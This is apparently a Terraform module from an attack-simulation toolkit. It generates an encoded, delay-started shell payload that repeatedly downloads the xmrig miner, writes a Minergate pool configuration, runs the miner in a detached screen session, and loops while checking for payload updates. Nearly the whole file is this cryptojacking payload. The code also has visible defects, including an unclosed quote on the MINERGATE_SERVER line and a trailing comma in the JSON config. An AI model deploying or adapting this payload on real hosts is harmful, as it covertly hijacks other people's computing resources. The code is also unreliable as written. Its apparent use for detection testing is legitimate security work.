locals {
    # nicehash_name = var.inputs["nicehash_name"]
    # nicehash_image = var.inputs["nicehash_image"]
    # nicehash_server = var.inputs["nicehash_server"]
    # nicehash_user = var.inputs["nicehash_user"]
    app_dirname = "host_cpu_miner"
    minergate_server = var.inputs["minergate_server"]
    minergate_user=var.inputs["minergate_user"]
    xmrig_version=var.inputs["xmrig_version"]

    payload = <<-EOT
    START_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
    MINERGATE_USER="${local.minergate_user}"
    MINERGATE_SERVER="${local.minergate_server}
    VERSION=${local.xmrig_version}
    
    log "starting script"
    while true; do
        log "killing screen sessions..."    
        screen -S ${local.app_dirname} -X quit
        screen -wipe
        log "truncating screen log..."
        truncate -s 0 /tmp/${local.app_dirname}.log
        log "removing previous app directory"
        rm -rf /${local.app_dirname}
        log "building app directory"
        mkdir -p /${local.app_dirname}/templates
        cd /${local.app_dirname}
        log "downloading xmrig..."
        curl -L https://github.com/xmrig/xmrig/releases/download/v$VERSION/xmrig-$VERSION-linux-x64.tar.gz -o xmrig.tar.gz --silent
        tar xvfz xmrig.tar.gz
        cd xmrig-$VERSION
        cat<<EOF > config.json
        {
        "algo": "cryptonight",
        "pools": [
            {
                "url": "$MINERGATE_SERVER",
                "user": "$MINERGATE_USER",
                "pass": "x",
                "enabled": true,
            }
        ],
        "retries": 10,
        "retry-pause": 3,
        "watch": true
        }
        EOF
        screen -d -L -Logfile /tmp/${local.app_dirname}.log -S ${local.app_dirname} -m /${local.app_dirname}/xmrig-$VERSION/xmrig -c config.json
        screen -S ${local.app_dirname} -X colon "logfile flush 0^M"
        log 'waiting 30 minutes...';
        sleep 1800
        if ! check_payload_update /tmp/payload_$SCRIPTNAME $START_HASH; then
            log "payload update detected - exiting loop and forcing payload download"
            rm -f /tmp/payload_$SCRIPTNAME
            break
        else
            log "restarting loop..."
        fi
    done
    log "Done."
    EOT
    
    base64_payload = templatefile("${path.module}/../../delayed_start.sh", { config = {
        script_name = var.inputs["tag"]
        log_rotation_count = 2
        apt_pre_tasks = ""
        apt_packages = ""
        apt_post_tasks = ""
        yum_pre_tasks =  ""
        yum_packages = ""
        yum_post_tasks = ""
        script_delay_secs = var.attack_delay
        next_stage_payload = local.payload
    }})

    outputs = {
        base64_payload = base64gzip(local.base64_payload)
        base64_uncompressed_payload = base64encode(local.base64_payload)
        base64_uncompressed_payload_additional = []
    }
}